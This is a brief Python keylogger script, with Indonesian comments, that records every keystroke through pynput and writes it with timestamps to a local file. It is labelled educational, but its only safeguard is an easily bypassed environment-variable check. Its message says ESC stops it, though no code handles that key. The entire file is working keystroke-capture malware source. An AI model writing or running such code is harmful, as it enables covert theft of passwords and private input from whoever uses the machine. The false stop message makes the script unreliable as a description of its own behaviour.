from pynput import keyboard
import logging

# Setup logging
logging.basicConfig(
    filename="keylog.txt", 
    level=logging.DEBUG, 
    format="%(asctime)s - %(message)s"
)

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error: {str(e)}")

# Deteksi dan blok jika dijalankan di lingkungan produksi
import os
if os.environ.get('PRODUCTION'):
    print("Akses ditolak - lingkungan produksi")
    exit()

# Hanya jalankan dalam lingkungan terkontrol
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger edukasi berjalan (tekan ESC untuk berhenti)")
    listener.join()